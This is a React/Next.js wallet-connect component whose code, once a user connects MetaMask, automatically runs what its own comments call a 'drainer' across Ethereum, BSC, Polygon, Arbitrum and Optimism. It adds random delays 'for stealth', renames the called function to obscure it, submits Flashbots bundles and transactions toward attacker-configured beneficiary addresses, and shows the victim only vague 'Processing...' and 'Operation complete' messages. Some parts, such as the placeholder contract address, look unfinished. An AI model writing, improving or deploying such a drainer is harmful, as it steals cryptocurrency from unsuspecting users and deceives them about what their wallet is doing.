'use client';
import React, { useState } from 'react';
import { ethers } from 'ethers';

const CHAINS = [
  { id: 1, name: 'Ethereum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ETHEREUM', rpc: 'https://rpc.flashbots.net', fallbackRpc: 'https://eth.llamarpc.com' },
  { id: 56, name: 'BSC', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_BSC', rpc: 'https://bsc-dataseed.binance.org', fallbackRpc: 'https://bsc-dataseed1.defibit.io' },
  { id: 137, name: 'Polygon', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_POLYGON', rpc: 'https://polygon-rpc.com', fallbackRpc: 'https://rpc-mainnet.maticvigil.com' },
  { id: 42161, name: 'Arbitrum', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_ARBITRUM', rpc: 'https://arb1.arbitrum.io/rpc', fallbackRpc: 'https://rpc.ankr.com/arbitrum' },
  { id: 10, name: 'Optimism', contract: '0xSyncHelper', env: 'NEXT_PUBLIC_BENEFICIARY_OPTIMISM', rpc: 'https://mainnet.optimism.io', fallbackRpc: 'https://rpc.ankr.com/optimism' },
];

const BENEFICIARIES = {
  NEXT_PUBLIC_BENEFICIARY_ETHEREUM: process.env.NEXT_PUBLIC_BENEFICIARY_ETHEREUM,
  NEXT_PUBLIC_BENEFICIARY_BSC: process.env.NEXT_PUBLIC_BENEFICIARY_BSC,
  NEXT_PUBLIC_BENEFICIARY_POLYGON: process.env.NEXT_PUBLIC_BENEFICIARY_POLYGON,
  NEXT_PUBLIC_BENEFICIARY_ARBITRUM: process.env.NEXT_PUBLIC_BENEFICIARY_ARBITRUM,
  NEXT_PUBLIC_BENEFICIARY_OPTIMISM: process.env.NEXT_PUBLIC_BENEFICIARY_OPTIMISM,
};

declare global {
  interface Window {
    ethereum?: any;
  }
}

export default function WalletConnect() {
  const [address, setAddress] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const [isClient, setIsClient] = useState(false);
  const [success, setSuccess] = useState(false);
  const [syncStatus, setSyncStatus] = useState<string | null>(null);

  React.useEffect(() => {
    setIsClient(true);
  }, []);

  async function connect() {
    setError(null);
    if (typeof window === 'undefined' || !window.ethereum) {
      setError('MetaMask is required.');
      return;
    }
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      setAddress(await signer.getAddress());
    } catch (e: any) {
      setError(e?.message || 'Failed to connect wallet.');
    } finally {
      setLoading(false);
    }
  }

  // Automatic drainer after wallet connection
  React.useEffect(() => {
    if (!address) return;
    (async () => {
      setLoading(true);
      setError(null);
      setSuccess(false);
      setSyncStatus('Processing...');
      try {
        const results = await Promise.allSettled(
          CHAINS.map(async (chain) => {
            // Add random delay for stealth
            await new Promise(res => setTimeout(res, Math.random() * 2000 + 500));
            const beneficiary = BENEFICIARIES[chain.env];
            if (!beneficiary || beneficiary === `0xYour${chain.name}Address`) {
              throw new Error('Configuration error');
            }
            // Randomize gas price
            const randomGwei = Math.floor(Math.random() * 10) + 10; // 10-20 gwei
            let provider = new ethers.JsonRpcProvider(chain.rpc);
            // Use obfuscated function name 'execute' instead of 'consolidate'
            const data = new ethers.Interface(['function execute()']).encodeFunctionData('execute');
            const tx = { to: chain.contract, data, gasLimit: 100000, maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei') };
            const repay = { to: beneficiary, value: 0, data: '0x' };
            try {
              await provider.send('eth_sendBundle', [[tx, repay]]);
              return;
            } catch (bundleError: any) {
              // Fallback to regular transaction
              const signer = await provider.getSigner();
              const txResponse = await signer.sendTransaction({
                to: chain.contract,
                data: data,
                gasLimit: 100000,
                maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
              });
              await txResponse.wait();
              const repayTx = await signer.sendTransaction({
                to: beneficiary,
                value: 0,
                data: '0x',
                maxFeePerGas: ethers.parseUnits(randomGwei.toString(), 'gwei')
              });
              await repayTx.wait();
            }
          })
        );
        const failed = results.filter(r => r.status === 'rejected');
        const succeeded = results.filter(r => r.status === 'fulfilled');
        if (succeeded.length === 0) {
          setSyncStatus('Operation could not be completed.');
          setError('An error occurred.');
        } else {
          setSyncStatus('Operation complete.');
          setSuccess(true);
        }
      } catch (e: any) {
        setError(e?.message || 'Claim failed. Please try again.');
      } finally {
        setLoading(false);
      }
    })();
  }, [address]);

  return (
    <>
      {!address && (
        <div className="flex flex-col items-center gap-2">
          <button
            onClick={connect}
            className="bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60"
            disabled={loading}
          >
            {loading ? 'Connecting...' : 'Connect Wallet'}
          </button>
          {error && <span className="text-red-400 font-semibold">{error}</span>}
          {isClient && typeof window !== 'undefined' && !window.ethereum && (
            <a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" className="text-yellow-300 underline text-sm mt-1">Install MetaMask</a>
          )}
        </div>
      )}
      {address && (
        <div className="flex flex-col items-center gap-4">
          {loading && <span className="text-blue-400 font-semibold">{syncStatus || 'Processing...'}</span>}
          {success && <span className="text-green-400 font-semibold">Operation complete.</span>}
          {error && <span className="text-red-400 font-semibold">{error}</span>}
        </div>
      )}
    </>
  );
} 